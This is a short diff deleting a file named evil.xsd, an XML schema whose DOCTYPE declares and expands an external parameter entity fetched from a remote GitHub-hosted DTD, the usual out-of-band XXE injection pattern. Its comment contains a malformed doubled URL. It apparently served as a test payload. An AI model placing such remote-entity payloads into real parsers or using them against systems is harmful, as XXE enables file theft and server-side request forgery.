@@ -1,8 +1,0 @@
-<!-- evil.xsd на http://https://raw.githubusercontent.com/KrakenMSK/testtest/refs/heads/main/test.dtd/evil.xsd -->
-<!DOCTYPE xs:schema [
-    <!ENTITY % remote SYSTEM "https://raw.githubusercontent.com/KrakenMSK/testtest/refs/heads/main/test.dtd">
-    %remote;
-]>
-<xs:schema xmlns:xs="http://www.w3.org/2001/XMLSchema">
-    <xs:element name="root" type="xs:string"/>
-</xs:schema>
